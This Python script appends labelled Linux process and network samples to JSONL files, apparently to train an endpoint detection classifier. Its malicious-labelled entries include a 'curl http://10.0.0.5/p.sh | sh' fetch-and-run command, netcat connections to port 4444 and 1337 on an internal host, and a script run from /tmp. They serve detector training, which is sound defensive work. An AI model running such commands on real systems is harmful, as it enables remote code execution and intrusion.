import json
from pathlib import Path


RAW_DIR = Path("data/training/EDR/raw")

PROCESS_SAMPLES = [
    {
        "pid": 9101, "ppid": 1, "name": "dash", "path": "/bin/dash",
        "command_line": "dash -c 'echo normal'", "parent_name": "bash",
        "user": "dudu", "is_first_seen": False, "label": 0,
    },
    {
        "pid": 9102, "ppid": 1, "name": "wrapper-2.0", "path": "/usr/bin/wrapper-2.0",
        "command_line": "wrapper-2.0", "parent_name": "systemd", "user": "root", "is_first_seen": False, "label": 0,
    },
    {
        "pid": 9103, "ppid": 1, "name": "python3", "path": "/usr/bin/python3",
        "command_line": "python3 -c print(platform.platform())", "parent_name": "bash", "user": "dudu", "is_first_seen": False, "label": 0,
    },
    {
        "pid": 9201, "ppid": 1, "name": "nc.traditional", "path": "/bin/nc.traditional",
        "command_line": "nc.traditional -vz 10.0.0.50 4444",
        "parent_name": "bash", "user": "dudu", "is_first_seen": True, "label": 1,
    },
    {
        "pid": 9202, "ppid": 1, "name": "bash", "path": "/tmp/lab_exec.sh",
        "command_line": "/tmp/lab_exec.sh", "parent_name": "dash", "user": "dudu", "is_first_seen": True, "label": 1,
    },
    {
        "pid": 9203, "ppid": 1, "name": "python3", "path": "/usr/bin/python3", 
        "command_line": "bash -c 'curl http://10.0.0.5/p.sh | sh'", "parent_name": "bash", "user": "dudu", "is_first_seen": True, "label": 1,
    },
    {
        "pid": 9204, "ppid": 1, "name": "bash", "path": "/bin/bash",
        "command_line": "bash -c 'curl http://10.0.0.5/p.sh | sh'", "parent_name": "bash", "user": "dudu", "is_first_seen": True, "label": 1,
    },
]

NETWORK_SAMPLES = [
    {
        "source_ip": "192.168.56.10", "source_port": 51001, "dest_ip": "10.0.0.10", "dest_port": 22, "process_name": "ssh", "protocol": "tcp", "bytes_sent": 0, "bytes_received": 0, "label": 0,
    },
    {
        "source_ip": "192.168.56.10", "source_port": 51002, "dest_ip": "1.1.1.1", "dest_port": 443, "process_name": "firefox-esr", "protocol": "tcp", "bytes_sent": 0, "bytes_received": 0, "label": 0,
    },
    {
        "source_ip": "192.168.56.10", "source_port": 51001, "dest_ip": "10.0.0.50", "dest_port": 4444, "process_name": "nc_traditional", "protocol": "tcp", "bytes_sent": 0, "bytes_received": 0, "label": 1,
    },
    {
        "source_ip": "192.168.56.10", "source_port": 52002, "dest_ip": "10.0.0.50", "dest_port": 1337, "process_name": "nc", "protocol": "tcp", "bytes_sent": 0, "bytes_received": 0, "label": 1,
    },
]

def append_jsonl(path,samples):
    with path.open("a", encoding="utf-8") as output:
        for sample in samples:
            output.write(json.dumps(sample, separators=(",", ":")) + "\n")

def main():
    append_jsonl(RAW_DIR / "process_linux.jsonl", PROCESS_SAMPLES)
    append_jsonl(RAW_DIR / "network_linux.jsonl", NETWORK_SAMPLES)
    print(f"Added {len(PROCESS_SAMPLES)} Linux process calibration samples")
    print(f"Added {len(NETWORK_SAMPLES)} Linux network calibration samples")

if __name__ == "__main__":
    main()